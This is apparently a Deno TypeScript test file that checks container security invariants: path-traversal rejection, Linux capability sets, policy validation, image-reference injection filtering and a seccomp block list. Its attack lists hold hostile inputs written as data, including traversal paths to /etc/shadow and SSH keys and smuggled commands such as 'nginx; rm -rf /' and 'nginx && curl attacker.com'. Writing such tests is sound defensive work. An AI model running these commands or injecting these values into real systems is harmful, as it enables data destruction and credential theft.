// SPDX-License-Identifier: MPL-2.0
// SPDX-FileCopyrightText: 2026 Jonathan D.A. Jewell <6759885+hyperpolymath@users.noreply.github.com>
//
// Aspect (security contract) tests for container isolation and capability model.
// Validates cross-cutting security invariants: namespace isolation, capability
// enforcement, injection prevention, and safe defaults.

import { assertEquals, assert } from "jsr:@std/assert";

// ---------------------------------------------------------------------------
// Namespace isolation contracts
// ---------------------------------------------------------------------------

/** Check that a container path cannot escape its root via traversal. */
function isContainerPathSafe(path: string): boolean {
  // Reject traversal sequences
  if (path.includes("..")) return false;
  // Reject null bytes
  if (path.includes("\0")) return false;
  // Reject empty path
  if (path.length === 0) return false;
  return true;
}

Deno.test("Security: container path traversal attacks rejected", () => {
  const attacks = [
    "../../etc/passwd",
    "../../../root/.ssh/authorized_keys",
    "/var/lib/../../etc/shadow",
    "./../../proc/1/cmdline",
    "/tmp/../../../etc/crontab",
    "/var/lib/%2E%2E/etc/passwd",       // URL-encoded traversal (decoded: ..)
  ];

  for (const path of attacks) {
    // URL-decode to catch encoded traversal
    let decoded: string;
    try {
      decoded = decodeURIComponent(path);
    } catch {
      decoded = path;
    }
    assert(
      !isContainerPathSafe(decoded),
      `traversal path '${path}' must be rejected`
    );
  }
});

Deno.test("Security: valid container paths accepted", () => {
  const valid = [
    "/var/lib/app/data",
    "/tmp/workdir",
    "/home/appuser/.config",
    "/etc/app/config.json",
    "/usr/local/bin/app",
  ];

  for (const path of valid) {
    assert(isContainerPathSafe(path), `valid path '${path}' must be accepted`);
  }
});

Deno.test("Security: null byte in path rejected", () => {
  const malicious = "/var/lib\x00malicious";
  assert(!isContainerPathSafe(malicious), "path with null byte must be rejected");
});

// ---------------------------------------------------------------------------
// Capability model contracts
// ---------------------------------------------------------------------------

/** All capabilities in the default drop set for unprivileged containers. */
const DEFAULT_DROP_CAPABILITIES = new Set([
  "CAP_AUDIT_CONTROL",
  "CAP_AUDIT_READ",
  "CAP_BLOCK_SUSPEND",
  "CAP_DAC_READ_SEARCH",
  "CAP_IPC_LOCK",
  "CAP_IPC_OWNER",
  "CAP_LEASE",
  "CAP_LINUX_IMMUTABLE",
  "CAP_MAC_ADMIN",
  "CAP_MAC_OVERRIDE",
  "CAP_MKNOD",
  "CAP_NET_ADMIN",
  "CAP_NET_BROADCAST",
  "CAP_NET_RAW",
  "CAP_SETFCAP",
  "CAP_SETPCAP",
  "CAP_SYS_ADMIN",
  "CAP_SYS_BOOT",
  "CAP_SYS_CHROOT",
  "CAP_SYS_MODULE",
  "CAP_SYS_NICE",
  "CAP_SYS_PACCT",
  "CAP_SYS_PTRACE",
  "CAP_SYS_RAWIO",
  "CAP_SYS_RESOURCE",
  "CAP_SYS_TIME",
  "CAP_SYS_TTY_CONFIG",
  "CAP_WAKE_ALARM",
]);

/** Known capability names (subset used in stapeln). */
const KNOWN_CAPABILITIES = new Set([
  "CAP_NET_ADMIN",
  "CAP_NET_BIND_SERVICE",
  "CAP_SYS_ADMIN",
  "CAP_CHOWN",
  "CAP_DAC_OVERRIDE",
  "CAP_SETUID",
  "CAP_SETGID",
  "CAP_KILL",
  "CAP_MKNOD",
  "CAP_NET_RAW",
  "CAP_SETPCAP",
  "CAP_SYS_CHROOT",
  "CAP_SYS_PTRACE",
  "CAP_AUDIT_WRITE",
]);

function isKnownCapability(cap: string): boolean {
  return KNOWN_CAPABILITIES.has(cap);
}

Deno.test("Security: unknown capabilities are rejected", () => {
  const unknown = [
    "CAP_FAKE",
    "CAP_ALL",
    "CAP_EVERYTHING",
    "",
    "NET_ADMIN",             // missing CAP_ prefix
    "cap_net_admin",         // lowercase
    "CAP_NET_ADMIN\nCAP_SYS_ADMIN", // injection attempt
  ];

  for (const cap of unknown) {
    assert(!isKnownCapability(cap), `unknown capability '${cap}' must be rejected`);
  }
});

Deno.test("Security: known capabilities are accepted", () => {
  for (const cap of KNOWN_CAPABILITIES) {
    assert(isKnownCapability(cap), `known capability '${cap}' must be accepted`);
  }
});

Deno.test("Security: dangerous capabilities are in default drop set", () => {
  const dangerous = [
    "CAP_SYS_ADMIN",   // kernel operations
    "CAP_NET_ADMIN",   // network configuration
    "CAP_SYS_PTRACE",  // process inspection/injection
    "CAP_SYS_MODULE",  // kernel module loading
  ];

  for (const cap of dangerous) {
    assert(DEFAULT_DROP_CAPABILITIES.has(cap),
      `dangerous capability '${cap}' must be in default drop set`);
  }
});

// ---------------------------------------------------------------------------
// Container isolation: no host namespace access by default
// ---------------------------------------------------------------------------

interface SecurityPolicy {
  allowHostPid: boolean;
  allowHostNetwork: boolean;
  allowHostIpc: boolean;
  privileged: boolean;
  allowPrivilegeEscalation: boolean;
  runAsNonRoot: boolean;
  readonlyRootfs: boolean;
}

/** Default secure policy for unprivileged containers. */
const DEFAULT_SECURITY_POLICY: SecurityPolicy = {
  allowHostPid: false,
  allowHostNetwork: false,
  allowHostIpc: false,
  privileged: false,
  allowPrivilegeEscalation: false,
  runAsNonRoot: true,
  readonlyRootfs: true,
};

function validateSecurityPolicy(policy: SecurityPolicy): string[] {
  const violations: string[] = [];
  if (policy.privileged) {
    violations.push("privileged mode requires explicit justification");
  }
  if (policy.allowPrivilegeEscalation && !policy.privileged) {
    violations.push("privilege escalation requires privileged mode");
  }
  if (policy.allowHostNetwork) {
    violations.push("host network access requires explicit justification");
  }
  if (policy.allowHostPid) {
    violations.push("host PID namespace access requires explicit justification");
  }
  if (!policy.runAsNonRoot && !policy.privileged) {
    violations.push("running as root requires privileged mode");
  }
  return violations;
}

Deno.test("Security: default policy has no violations", () => {
  const violations = validateSecurityPolicy(DEFAULT_SECURITY_POLICY);
  assertEquals(violations.length, 0,
    `default policy must have no violations, got: ${violations.join(", ")}`);
});

Deno.test("Security: privileged mode is flagged", () => {
  const policy = { ...DEFAULT_SECURITY_POLICY, privileged: true };
  const violations = validateSecurityPolicy(policy);
  assert(violations.length > 0, "privileged mode must generate a violation");
});

Deno.test("Security: host network access is flagged", () => {
  const policy = { ...DEFAULT_SECURITY_POLICY, allowHostNetwork: true };
  const violations = validateSecurityPolicy(policy);
  assert(violations.length > 0, "host network access must generate a violation");
});

Deno.test("Security: host PID namespace is flagged", () => {
  const policy = { ...DEFAULT_SECURITY_POLICY, allowHostPid: true };
  const violations = validateSecurityPolicy(policy);
  assert(violations.length > 0, "host PID access must generate a violation");
});

// ---------------------------------------------------------------------------
// Image reference security contracts
// ---------------------------------------------------------------------------

function validateImageRef(image: string): { safe: boolean; reason?: string } {
  if (image.length === 0) {
    return { safe: false, reason: "empty image reference" };
  }
  // Shell metacharacters
  const shellMetachars = [";", "|", "&", "$", "`", "(", ")", "{", "}", "<", ">", "!", "*", "?"];
  for (const ch of shellMetachars) {
    if (image.includes(ch)) {
      return { safe: false, reason: `contains shell metachar '${ch}'` };
    }
  }
  // Injection via newline
  if (image.includes("\n") || image.includes("\r") || image.includes("\0")) {
    return { safe: false, reason: "contains control character" };
  }
  return { safe: true };
}

Deno.test("Security: valid image references pass", () => {
  const valid = [
    "nginx:1.27",
    "cgr.dev/chainguard/nginx:latest",
    "ghcr.io/myorg/myapp:v2.0.0-alpha.1",
    "registry.example.com:5000/myimage:latest",
  ];

  for (const image of valid) {
    const result = validateImageRef(image);
    assert(result.safe, `image '${image}' must be safe: ${result.reason}`);
  }
});

Deno.test("Security: image injection attacks rejected", () => {
  const attacks = [
    "nginx; rm -rf /",
    "nginx | cat /etc/passwd",
    "$(whoami):latest",
    "`id`:alpine",
    "nginx:latest\necho pwned",
    "nginx:latest\0hidden",
    "nginx && curl attacker.com",
  ];

  for (const image of attacks) {
    const result = validateImageRef(image);
    assert(!result.safe, `injection '${image}' must be rejected: ${result.reason}`);
  }
});

// ---------------------------------------------------------------------------
// Seccomp: sensitive syscall filtering contracts
// ---------------------------------------------------------------------------

/** Syscalls that must be blocked in the default seccomp profile. */
const BLOCKED_SYSCALLS = [
  "ptrace",        // process injection
  "kexec_load",    // kernel replacement
  "create_module", // kernel module loading
  "init_module",   // kernel module loading
  "finit_module",  // kernel module loading
  "delete_module", // kernel module removal
  "reboot",        // system reboot
  "pivot_root",    // filesystem pivot (escape vector)
];

/** Syscalls that are allowed in the default seccomp profile. */
const ALLOWED_SYSCALLS = [
  "read",
  "write",
  "open",
  "close",
  "stat",
  "fstat",
  "lstat",
  "poll",
  "lseek",
  "mmap",
  "mprotect",
  "munmap",
  "brk",
  "socket",
  "connect",
  "accept",
  "sendto",
  "recvfrom",
  "fork",
  "execve",
  "exit",
  "wait4",
];

function isBlockedSyscall(syscall: string): boolean {
  return BLOCKED_SYSCALLS.includes(syscall);
}

Deno.test("Security: dangerous syscalls are in block list", () => {
  for (const syscall of BLOCKED_SYSCALLS) {
    assert(isBlockedSyscall(syscall),
      `dangerous syscall '${syscall}' must be in block list`);
  }
});

Deno.test("Security: common safe syscalls are not blocked", () => {
  for (const syscall of ALLOWED_SYSCALLS) {
    assert(!isBlockedSyscall(syscall),
      `safe syscall '${syscall}' must not be blocked`);
  }
});

Deno.test("Security: ptrace is always blocked (container escape vector)", () => {
  assert(isBlockedSyscall("ptrace"),
    "ptrace must always be in the block list");
});

Deno.test("Security: kernel module operations are always blocked", () => {
  const kernelModuleOps = ["init_module", "finit_module", "delete_module", "create_module"];
  for (const op of kernelModuleOps) {
    assert(isBlockedSyscall(op),
      `kernel module operation '${op}' must be blocked`);
  }
});
